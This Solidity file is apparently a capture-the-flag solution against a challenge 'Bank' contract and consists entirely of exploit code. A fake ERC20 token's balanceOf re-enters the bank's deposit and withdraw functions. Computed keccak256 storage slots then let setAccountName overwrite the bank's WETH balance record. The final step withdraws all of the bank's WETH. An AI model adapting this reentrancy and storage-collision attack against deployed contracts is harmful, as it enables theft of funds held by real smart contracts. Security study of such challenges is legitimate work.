import "public/Setup.sol";

contract BadToken is ERC20Like {
    mapping(address => uint) balances;
    
    uint stage = 0;
    
    function transfer(address dst, uint qty) public returns (bool) {
        balances[msg.sender] -= qty;
        balances[dst] += qty;
        return true;
    }
    
    function transferFrom(address src, address dst, uint qty) public returns (bool) {
        balances[src] -= qty;
        balances[dst] += qty;
        return true;
    }
    
    function approve(address, uint) public returns (bool) {
        return true;
    }
    
    function balanceOf(address who) public view returns (uint) {
        uint result = balances[who];
        
        if (stage == 1) {
            stage = 2;
            
            bank.depositToken(0, this, 0);
        } else if (stage == 2) {
            stage = 3;
            
            bank.withdrawToken(0, this, 0);
        }
        
        return result;
    }
    
    Bank private bank;
    WETH9 private weth;
    
    function exploit(Setup setup) public {
        bank = setup.bank();
        weth = setup.weth();
        
        bank.depositToken(0, this, 0);
        
        stage = 1;
        bank.withdrawToken(0, this, 0);
        
        bytes32 myArraySlot = keccak256(bytes32(address(this)), uint(2));
        bytes32 myArrayStart = keccak256(myArraySlot);
        
        uint account = 0;
        uint slotsNeeded;
        while (true) {
            bytes32 account0Start = bytes32(uint(myArrayStart) + 3*account);
            bytes32 account0Balances = bytes32(uint(account0Start) + 2);
            bytes32 wethBalance = keccak256(bytes32(address(weth)), account0Balances);
            
            slotsNeeded = (uint(-1) - uint(myArrayStart));
            slotsNeeded++;
            slotsNeeded += uint(wethBalance);
            if (uint(slotsNeeded) % 3 == 0) {
                break;
            }
            account++;
        }
        
        uint accountId = uint(slotsNeeded) / 3;
        
        bank.setAccountName(accountId, string(abi.encodePacked(bytes31(uint248(uint(-1))))));
        
        bank.withdrawToken(account, address(weth), weth.balanceOf(address(bank)));
    }
}

contract Exploit {
    Setup public set;
    constructor(Setup setup) public {
        set = setup;
    }

    function attack() {
        new BadToken().exploit(set);
    }
}